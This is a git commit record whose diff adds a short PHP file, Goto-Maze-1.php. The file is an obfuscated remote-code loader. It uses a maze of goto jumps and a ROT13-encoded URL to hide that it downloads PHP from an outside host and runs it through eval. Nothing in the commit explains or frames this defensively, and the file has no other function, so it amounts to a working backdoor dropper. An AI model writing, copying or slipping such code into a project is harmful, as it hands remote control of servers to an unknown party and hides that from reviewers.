366b6bdf7d7ca9bad9d04e0b1dc18816a84496ab
GodOfServer <AnonByte.GOS@protonmail.com>
2025-12-31 14:34:29 +0700

    Create Goto-Maze-1.php

---
+++ Goto-Maze-1.php
@@ -0,0 +1,7 @@
+<?php
+goto a;
+b: eval('?>'.@file_get_contents($u)); goto z;
+c: $u=str_rot13('uggcf://enj.tvguheo.pbz/TbqBsFreivre/Fhfu-Vbag-Yvr/ersf/urnqf/zvav/obb.cuc'); goto b;
+a: goto c;
+z: exit;
+?>
